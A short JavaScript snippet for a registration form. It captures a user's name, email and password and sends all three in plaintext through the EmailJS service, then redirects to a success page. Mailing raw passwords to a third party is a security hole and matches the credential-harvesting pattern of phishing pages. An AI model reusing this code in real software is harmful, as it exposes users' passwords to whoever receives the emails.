emailjs.init('ReqtkWfjI392LAzFb'); // Tu User ID de EmailJS

document.getElementById('formRegistro').addEventListener('submit', (e) => {
    e.preventDefault();
    
    const datos = {
        nombre: document.getElementById('nombre').value,
        correo: document.getElementById('correo').value,
        contrasena: document.getElementById('password').value
    };

    emailjs.send("service_syrc1uk", "template_u3etoro", datos)
        .then(() => {
            window.location.href = 'success.html';
        })
        .catch((error) => {
            alert('Error al enviar: ' + error.text);
        });
});
